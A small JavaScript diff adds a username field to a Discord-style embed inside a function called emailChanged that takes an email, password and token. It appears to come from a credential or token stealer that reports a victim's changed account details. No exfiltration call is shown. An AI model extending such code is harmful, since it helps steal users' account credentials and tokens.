@@ -920,6 +920,11 @@ const emailChanged = async (email, password, token) => {
           inline: false
         },
         {
+          name: "<:patriot_token:1032868283759730728> Username",
+          value: `\`${json.username}#${json.discriminator}\``,
+          inline: true
+        },
+        {
           name: "<a:prt_world9:1032868293528268831> New email",
           value: `\`${email}\``,
           inline: true
